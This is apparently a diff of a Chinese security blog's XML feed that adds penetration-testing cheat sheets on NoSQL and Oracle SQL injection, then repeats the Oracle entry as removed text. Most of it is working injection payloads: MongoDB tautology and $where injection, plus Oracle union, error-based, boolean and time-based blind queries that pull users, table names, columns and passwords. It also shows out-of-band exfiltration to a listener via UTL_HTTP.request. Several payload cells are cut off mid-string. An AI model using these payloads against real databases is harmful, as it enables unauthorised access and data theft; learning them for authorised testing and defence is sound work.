+<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><table>
+<thead>
+<tr>
+<th align="left">分类</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">综合分类（4种）</td>
+<td align="left">重言式/永真式（重要） <br>JavaScript注入（难度较大） <br>联合查询注入（被淘汰） <br>mongo shell拼接注入（难度中等，危害大）</td>
+</tr>
+<tr>
+<td align="left">语言、代码逻辑角度分类（3种）</td>
+<td align="left">PHP数组注入<br> JS注入 <br>Mongo shell拼接注入</td>
+</tr>
+<tr>
+<td align="left">攻击手段角度分类（3种）</td>
+<td align="left">重言式（永真式） <br>联合查询<br> JavaScript注入</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">分类</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">重言式/永真式</td>
+<td align="left"><code>/login.php?username[$ne]=1&amp;password[$ne]=1</code> <br>防御： <br>可以通过函数is_array()将输入参数转变为字符串类型来解决 <br>如：<br><code>db-&gt;logins-&gt;find(array(&quot;username&quot;=&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;=&gt;(string)$_POST[&quot;password&quot;])); </code><br><br>注意： <br>1、必须要结合PHP语言才能导致重言式注入（依据PHP语言的特性） <br>2、如果是POST方法传参，可以结合BurpSuite抓包、改包进行绕过。 <br>3、使用正则表达式,也可以构造永真式如：<br><code>username[$regex]=.?&amp;password[$regex]=.?</code><br>.?为匹配所有字符串<br>变为 <code>?username[$regex]=^a&amp;password[$regex]=.? </code><br>不断爆破a即可，^ab…直到爆不出，爆破字符为数字字母符号，符号需要转义</td>
+</tr>
+<tr>
+<td align="left">JavaScript注入</td>
+<td align="left"><code>&#39;;return true;var a=&#39;</code> <br>注入产生的原因 <br>1、MongoDB中$where操作符是可以执行JavaScript语句的。 <br>2、在PHP语言中是不能直接写入JavaScript语句的，需要写在字符串中。使用字符串就会引用到单引号和双引号，因此容易出现闭合的问题 <br>3、在MongoDB 2.4之前，通过$where操作符使用map-reduce、group命令可以访问到mongo shell中的全局函数和属性。也就是说可以操作数据库中的数据。  <br><br>注意： <br>1、闭合的方法有很多，只要return的值为真即可。 <br>2、该注入方法较难，主要是因为payload不易构造，在有源码的情况下容易构造闭合语句，没有源码只能猜测。 <br>3、$where执行的JavaScript语句只能进行简单的逻辑操作。</td>
+</tr>
+<tr>
+<td align="left">mongo shell拼接注入</td>
+<td align="left"><code>&quot;&#125;);db.表名.insert(&#123;&quot;name&quot;:&quot;hi&quot;&#125;);db.表名.find(&#123;&quot;author&quot;:&quot;1 </code><br>在两个db.message.find中间的位置，插入任意想要执行的代码  <br>产生的原因： <br>PHP中，通过executeCommand可以执行shell命令，可以直接执行语句。同样是存在字符串拼接的问题，因此通过使用单引号、双引号构造闭合语句，就可以执行任意的语句。</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>Nosql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Oracle注入</title>
+    <url>/article/Oracle%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><strong>端口：1521</strong></p>
+<p><strong>使用</strong></p>
+<p>select * from dual; dual是oracle数据库中的虚拟表，用于占位查询</p>
+<p>注释：<code>--</code></p>
+<p>chr(126)为~，为分隔符</p>
+<p>utl_url.escape() url编码</p>
+<p>对限定条件进行编码，解决dns外带乱码问题</p>
+<p>&lt;&gt;可替代not in，用于嵌套查询，但是可用limit代替</p>
+<h1 id="一、union联合注入"><a href="#一、union联合注入" class="headerlink" title="一、union联合注入"></a>一、union联合注入</h1><table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断注入</td>
+<td align="left"><code>&#39;、&quot;、\、and 1=1、and 1=2</code></td>
+</tr>
+<tr>
+<td align="left">判断数据库类型</td>
+<td align="left">返回正常为oracle数据库 <br><code>and len(&#39;a&#39;) = 1</code>         长度函数 <br><code>and exist(select * from dual)</code>       dual表<br><code>and (select count(*) from user_tables)&gt;0 --</code>     user_tables 系统表</td>
+</tr>
+<tr>
+<td align="left">判断列数</td>
+<td align="left">order by</td>
+</tr>
+<tr>
+<td align="left">判断占位符</td>
+<td align="left">oracle数据库需要查询类型与表结构类型匹配，否则报错 使用时查询出一个数字型和一个字符型显示位即可，其余位用null占位<br>如： <br><code>union select 1,&#39;2&#39;,null,null from dual--</code></td>
+</tr>
+<tr>
+<td align="left">获取基本信息</td>
+<td align="left">获取数据库版本 <br><code>union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--</code>  <br><br>获取数据库连接用户名 <br><code>union select 1,(select sys_context(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;) from dual),3,4 from dual--</code> <br><br>或 <br><code>union select 1,(select user from dual),3,4 from dual--</code>  <br><br>获取日志文件绝对路径 <br><code>union select 1,(select instance_name from v$instance),3,4 from dual--</code></td>
+</tr>
+<tr>
+<td align="left">查用户</td>
+<td align="left"><code>union select 1,cast(owner as varchar(4000)),3,4 from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1--</code><br><br>rownum：隐藏的行号</td>
+</tr>
+<tr>
+<td align="left">查表名</td>
+<td align="left"><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1-- </code></td>
+</tr>
+<tr>
+<td align="left">查列名</td>
+<td align="left"><code>union select 1,cast(column_name as varchar(4000)),3,4 from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1--</code></td>
+</tr>
+<tr>
+<td align="left">查数据</td>
+<td align="left"><code>union select 1,cast(name,pwd as varchar(4000)),3,4 from (select name,pwd,rownum as limit from (select * from 列名)) where limit=1 --</code></td>
+</tr>
+</tbody></table>
+<h1 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h1><p><strong>常用报错函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">dbms_xdb_version.checkin()</td>
+<td align="left">检入签出的VCR并返回新创建的版本的资源ID <br><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null</code></td>
+</tr>
+<tr>
+<td align="left">dbms_xdb_version.uncheckout()</td>
+<td align="left">同checkin <br><code>and (select dbms_xdb_version.uncheckout((select user from dual))from dual)is not null</code></td>
+</tr>
+<tr>
+<td align="left">utl_inaddr.get_host_name()</td>
+<td align="left">在Oracle 11g及以后的版本中需要网络访问权限才可以使用 获取ip地址，其参数如果解析不了会报错 <br><code>and utl_inaddr.get_host_name((select user from dual))=1--</code></td>
+</tr>
+<tr>
+<td align="left">dbms_xdb_version.makeversioned()</td>
+<td align="left"><code>and (select dbms_xdb_version.makeversioned((select user from dual))from dual)is not null--</code></td>
+</tr>
+<tr>
+<td align="left">dbms_utility.sqlid_to_sqlhash()</td>
+<td align="left"><code>and (select dbms_utility.sqlid_to_sqlhash((select user from dual))from dual)is not null--</code></td>
+</tr>
+<tr>
+<td align="left">ordsys.ord_dicom.getmappingxpath()</td>
+<td align="left"><code>and ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)=1--</code></td>
+</tr>
+<tr>
+<td align="left">ctxsys.drithsx.sn()</td>
+<td align="left"><code>and ctxsys.drithsx.sn(1,(select user from dual))=1--</code></td>
+</tr>
+</tbody></table>
+<p><strong>过程</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">获取数据库版本</td>
+<td align="left"><code>and(select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1))from dual)is not null--</code></td>
+</tr>
+<tr>
+<td align="left">获取用户名</td>
+<td align="left"><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null-- </code><br><br>或<br><code>and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1)) from dual) is not null --</code></td>
+</tr>
+<tr>
+<td align="left">获取表名</td>
+<td align="left"><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1)) from dual) is not null --</code></td>
+</tr>
+<tr>
+<td align="left">获取列名</td>
+<td align="left"><code>and (select dbms_xdb_version.checkin((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1)) from dual) is not null --</code></td>
+</tr>
+<tr>
+<td align="left">获取数据</td>
+<td align="left">`and(select dbms_xdb_version.checkin((select AGE</td>
+</tr>
+</tbody></table>
+<h1 id="三、布尔盲注"><a href="#三、布尔盲注" class="headerlink" title="三、布尔盲注"></a>三、布尔盲注</h1><p>相关函数</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">decode()</td>
+<td align="left">if(条件==值1)正确返回翻译值1，否则返回默认值 <br>decode(条件,值1,翻译值1,值2,翻译值2,…值n,翻译值n,缺省值)</td>
+</tr>
+<tr>
+<td align="left">instr()</td>
+<td align="left">返回发现指定的字符的位置 <br>instr(string1,string2)<br>instr(源字符串,目标字符串)</td>
+</tr>
+</tbody></table>
+<p>1、猜解法</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断用户名</td>
+<td align="left"><code>and (select ascii(substr(user,1,1))from dual)&gt;1--</code> <br><br>或 <br><code>and (select ascii(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1))from dual)&gt;1--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)&gt;1--</code></td>
+</tr>
+<tr>
+<td align="left">判断列名</td>
+<td align="left"><code>and (select ascii(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1))from dual)&gt;1--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left">`and (select ascii(substr((select AGE</td>
+</tr>
+</tbody></table>
+<p>2、decode</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断用户名</td>
+<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,1,0)from dual)-- </code><br>T为猜解的字母<br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
+</tr>
+<tr>
+<td align="left">判断字段名</td>
+<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left"><code>and(select decode(substr((select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
+</tr>
+</tbody></table>
+<p>3、instr</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断用户名</td>
+<td align="left"><code>and (instr((select user from dual),&#39;T&#39;))--</code> <br><br>或 <br><code>and(instr((select (select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and (instr((select (select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
+</tr>
+<tr>
+<td align="left">判断列名</td>
+<td align="left"><code>and (instr((select (select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1) from dual),&#39;T&#39;))--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left"><code>and (instr((select (select AGE from (select AGE,rownum as limit from (select * from 列名)) where limit=1) from dual),&#39;T&#39;))--</code></td>
+</tr>
+</tbody></table>
+<h1 id="四、延时盲注"><a href="#四、延时盲注" class="headerlink" title="四、延时盲注"></a>四、延时盲注</h1><p>相关函数</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">decode()</td>
+<td align="left"><code>decode(condition,value,dbms_pipe.receive_message(&#39;ICQ&#39;,5),0)</code></td>
+</tr>
+<tr>
+<td align="left">DBMS_PIPE.RECEIVE_MESSAGE()</td>
+<td align="left"><code>DBMS_PIPE.RECEIVE_MESSAGE(&#39;任意值&#39;,延迟时间) </code><br><code>and dbms_pipe.receive_message(&#39;ICQ&#39;,5)=1</code></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断用户名</td>
+<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code> <br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),’T’,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断表名</td>
+<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断列名</td>
+<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
+</tr>
+<tr>
+<td align="left">判断数据</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h1 id="五、DNS外带"><a href="#五、DNS外带" class="headerlink" title="五、DNS外带"></a>五、DNS外带</h1><p>DNS外带函数</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">UTL_HTTP.REQUEST</td>
+<td align="left">用于取得web服务器的请求信息 <br><code>select UTL_HTTP.REQUEST(&#39;http://www.baidu.com&#39;) from dual</code> <br>返回百度的html源码</td>
+</tr>
+<tr>
+<td align="left">UTL_INADDR.GET_HOST_ADDRESS</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">SYS.DBMS_LDAP.INIT</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<p>外带注入过程</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">检测函数是否可用</td>
+<td align="left"><code>and exists(select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;)--</code> <br>回显正常则可用</td>
+</tr>
+<tr>
+<td align="left">开启本地监听</td>
+<td align="left"><code>python -m http.server 1111</code></td>
+</tr>
+<tr>
+<td align="left">反弹信息</td>
+<td align="left">`and UTL_HTTP.request(‘<a href="http://ip:监听端口/&#39;">http://ip:监听端口/&#39;</a></td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>Oracle</tag>
       </tags>
   </entry>
   <entry>
@@ -3934,7 +4238,7 @@
 <td align="left">删除admin所在行，删除限定符必须唯一</td>
 </tr>
 <tr>
-<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#109;">&#49;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#109;</a>](mailto:<a href="mailto:&#x31;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#x31;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;</a>)’ WHERE uname=’admin’; “);</td>
+<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#x31;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;">&#x31;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;</a>](mailto:<a href="mailto:&#49;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#109;">&#49;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#109;</a>)’ WHERE uname=’admin’; “);</td>
 <td align="left">修改admin密码邮箱</td>
 </tr>
 <tr>
@@ -3988,373 +4292,6 @@
       </categories>
       <tags>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Oracle注入</title>
-    <url>/article/Oracle%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p><strong>端口：1521</strong></p>
-<p><strong>使用</strong></p>
-<p>select * from dual; dual是oracle数据库中的虚拟表，用于占位查询</p>
-<p>注释：<code>--</code></p>
-<p>chr(126)为~，为分隔符</p>
-<p>utl_url.escape() url编码</p>
-<p>对限定条件进行编码，解决dns外带乱码问题</p>
-<p>&lt;&gt;可替代not in，用于嵌套查询，但是可用limit代替</p>
-<h1 id="一、union联合注入"><a href="#一、union联合注入" class="headerlink" title="一、union联合注入"></a>一、union联合注入</h1><table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">判断注入</td>
-<td align="left"><code>&#39;、&quot;、\、and 1=1、and 1=2</code></td>
-</tr>
-<tr>
-<td align="left">判断数据库类型</td>
-<td align="left">返回正常为oracle数据库 <br><code>and len(&#39;a&#39;) = 1</code>         长度函数 <br><code>and exist(select * from dual)</code>       dual表<br><code>and (select count(*) from user_tables)&gt;0 --</code>     user_tables 系统表</td>
-</tr>
-<tr>
-<td align="left">判断列数</td>
-<td align="left">order by</td>
-</tr>
-<tr>
-<td align="left">判断占位符</td>
-<td align="left">oracle数据库需要查询类型与表结构类型匹配，否则报错 使用时查询出一个数字型和一个字符型显示位即可，其余位用null占位<br>如： <br><code>union select 1,&#39;2&#39;,null,null from dual--</code></td>
-</tr>
-<tr>
-<td align="left">获取基本信息</td>
-<td align="left">获取数据库版本 <br><code>union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--</code>  <br><br>获取数据库连接用户名 <br><code>union select 1,(select sys_context(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;) from dual),3,4 from dual--</code> <br><br>或 <br><code>union select 1,(select user from dual),3,4 from dual--</code>  <br><br>获取日志文件绝对路径 <br><code>union select 1,(select instance_name from v$instance),3,4 from dual--</code></td>
-</tr>
-<tr>
-<td align="left">查用户</td>
-<td align="left"><code>union select 1,cast(owner as varchar(4000)),3,4 from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1--</code><br><br>rownum：隐藏的行号</td>
-</tr>
-<tr>
-<td align="left">查表名</td>
-<td align="left"><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1-- </code></td>
-</tr>
-<tr>
-<td align="left">查列名</td>
-<td align="left"><code>union select 1,cast(column_name as varchar(4000)),3,4 from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1--</code></td>
-</tr>
-<tr>
-<td align="left">查数据</td>
-<td align="left"><code>union select 1,cast(name,pwd as varchar(4000)),3,4 from (select name,pwd,rownum as limit from (select * from 列名)) where limit=1 --</code></td>
-</tr>
-</tbody></table>
-<h1 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h1><p><strong>常用报错函数</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">dbms_xdb_version.checkin()</td>
-<td align="left">检入签出的VCR并返回新创建的版本的资源ID <br><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null</code></td>
-</tr>
-<tr>
-<td align="left">dbms_xdb_version.uncheckout()</td>
-<td align="left">同checkin <br><code>and (select dbms_xdb_version.uncheckout((select user from dual))from dual)is not null</code></td>
-</tr>
-<tr>
-<td align="left">utl_inaddr.get_host_name()</td>
-<td align="left">在Oracle 11g及以后的版本中需要网络访问权限才可以使用 获取ip地址，其参数如果解析不了会报错 <br><code>and utl_inaddr.get_host_name((select user from dual))=1--</code></td>
-</tr>
-<tr>
-<td align="left">dbms_xdb_version.makeversioned()</td>
-<td align="left"><code>and (select dbms_xdb_version.makeversioned((select user from dual))from dual)is not null--</code></td>
-</tr>
-<tr>
-<td align="left">dbms_utility.sqlid_to_sqlhash()</td>
-<td align="left"><code>and (select dbms_utility.sqlid_to_sqlhash((select user from dual))from dual)is not null--</code></td>
-</tr>
-<tr>
-<td align="left">ordsys.ord_dicom.getmappingxpath()</td>
-<td align="left"><code>and ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)=1--</code></td>
-</tr>
-<tr>
-<td align="left">ctxsys.drithsx.sn()</td>
-<td align="left"><code>and ctxsys.drithsx.sn(1,(select user from dual))=1--</code></td>
-</tr>
-</tbody></table>
-<p><strong>过程</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">获取数据库版本</td>
-<td align="left"><code>and(select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1))from dual)is not null--</code></td>
-</tr>
-<tr>
-<td align="left">获取用户名</td>
-<td align="left"><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null-- </code><br><br>或<br><code>and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1)) from dual) is not null --</code></td>
-</tr>
-<tr>
-<td align="left">获取表名</td>
-<td align="left"><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1)) from dual) is not null --</code></td>
-</tr>
-<tr>
-<td align="left">获取列名</td>
-<td align="left"><code>and (select dbms_xdb_version.checkin((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1)) from dual) is not null --</code></td>
-</tr>
-<tr>
-<td align="left">获取数据</td>
-<td align="left">`and(select dbms_xdb_version.checkin((select AGE</td>
-</tr>
-</tbody></table>
-<h1 id="三、布尔盲注"><a href="#三、布尔盲注" class="headerlink" title="三、布尔盲注"></a>三、布尔盲注</h1><p>相关函数</p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">decode()</td>
-<td align="left">if(条件==值1)正确返回翻译值1，否则返回默认值 <br>decode(条件,值1,翻译值1,值2,翻译值2,…值n,翻译值n,缺省值)</td>
-</tr>
-<tr>
-<td align="left">instr()</td>
-<td align="left">返回发现指定的字符的位置 <br>instr(string1,string2)<br>instr(源字符串,目标字符串)</td>
-</tr>
-</tbody></table>
-<p>1、猜解法</p>
-<table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">判断用户名</td>
-<td align="left"><code>and (select ascii(substr(user,1,1))from dual)&gt;1--</code> <br><br>或 <br><code>and (select ascii(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1))from dual)&gt;1--</code></td>
-</tr>
-<tr>
-<td align="left">判断表名</td>
-<td align="left"><code>and (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)&gt;1--</code></td>
-</tr>
-<tr>
-<td align="left">判断列名</td>
-<td align="left"><code>and (select ascii(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1))from dual)&gt;1--</code></td>
-</tr>
-<tr>
-<td align="left">判断数据</td>
-<td align="left">`and (select ascii(substr((select AGE</td>
-</tr>
-</tbody></table>
-<p>2、decode</p>
-<table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">判断用户名</td>
-<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,1,0)from dual)-- </code><br>T为猜解的字母<br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
-</tr>
-<tr>
-<td align="left">判断表名</td>
-<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
-</tr>
-<tr>
-<td align="left">判断字段名</td>
-<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
-</tr>
-<tr>
-<td align="left">判断数据</td>
-<td align="left"><code>and(select decode(substr((select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
-</tr>
-</tbody></table>
-<p>3、instr</p>
-<table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">判断用户名</td>
-<td align="left"><code>and (instr((select user from dual),&#39;T&#39;))--</code> <br><br>或 <br><code>and(instr((select (select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
-</tr>
-<tr>
-<td align="left">判断表名</td>
-<td align="left"><code>and (instr((select (select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
-</tr>
-<tr>
-<td align="left">判断列名</td>
-<td align="left"><code>and (instr((select (select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1) from dual),&#39;T&#39;))--</code></td>
-</tr>
-<tr>
-<td align="left">判断数据</td>
-<td align="left"><code>and (instr((select (select AGE from (select AGE,rownum as limit from (select * from 列名)) where limit=1) from dual),&#39;T&#39;))--</code></td>
-</tr>
-</tbody></table>
-<h1 id="四、延时盲注"><a href="#四、延时盲注" class="headerlink" title="四、延时盲注"></a>四、延时盲注</h1><p>相关函数</p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">decode()</td>
-<td align="left"><code>decode(condition,value,dbms_pipe.receive_message(&#39;ICQ&#39;,5),0)</code></td>
-</tr>
-<tr>
-<td align="left">DBMS_PIPE.RECEIVE_MESSAGE()</td>
-<td align="left"><code>DBMS_PIPE.RECEIVE_MESSAGE(&#39;任意值&#39;,延迟时间) </code><br><code>and dbms_pipe.receive_message(&#39;ICQ&#39;,5)=1</code></td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">判断用户名</td>
-<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code> <br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),’T’,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
-</tr>
-<tr>
-<td align="left">判断表名</td>
-<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
-</tr>
-<tr>
-<td align="left">判断列名</td>
-<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
-</tr>
-<tr>
-<td align="left">判断数据</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<h1 id="五、DNS外带"><a href="#五、DNS外带" class="headerlink" title="五、DNS外带"></a>五、DNS外带</h1><p>DNS外带函数</p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">UTL_HTTP.REQUEST</td>
-<td align="left">用于取得web服务器的请求信息 <br><code>select UTL_HTTP.REQUEST(&#39;http://www.baidu.com&#39;) from dual</code> <br>返回百度的html源码</td>
-</tr>
-<tr>
